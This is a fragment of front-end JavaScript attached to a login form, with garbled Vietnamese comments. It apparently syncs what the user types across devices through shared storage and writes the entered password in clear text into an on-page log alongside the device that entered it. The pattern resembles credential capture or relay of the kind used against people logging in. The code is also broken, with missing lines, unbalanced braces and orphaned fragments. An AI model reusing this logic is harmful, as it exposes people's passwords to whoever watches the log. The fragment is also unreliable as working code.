    <script>
        const form = document.getElementById('loginForm');

        // Ph√°t hi·ªán lo·∫°i thi·∫øt b·ªã

        // L∆∞u d·ªØ li·ªáu v√†o storage ƒë·ªÉ ƒë·ªìng b·ªô
        async function syncData(type, data) {

                    data: data,
                    device: deviceType,
                    timestamp: Date.now()

                console.log('Synced:', syncData);

        // ƒê·ªçc d·ªØ li·ªáu ƒë·ªìng b·ªô t·ª´ storage
        async function checkSync() {
            try {

                const passwordResult = await window.storage.get(`sync:${sessionId}:password`, true);

                    if (emailData.device !== deviceType) {

                        addLog(`<span class="log-device">${passwordData.device}</span> ƒë√£ nh·∫≠p Password: <span class="log-password">"${passwordData.data}"</span>`);
                    }

            }
        }
        
        // Ki·ªÉm tra ƒë·ªìng b·ªô m·ªói 2 gi√¢y

        // C·∫≠p nh·∫≠t tr·∫°ng th√°i k·∫øt n·ªëi

        // Log khi ng∆∞·ªùi d√πng nh·∫≠p
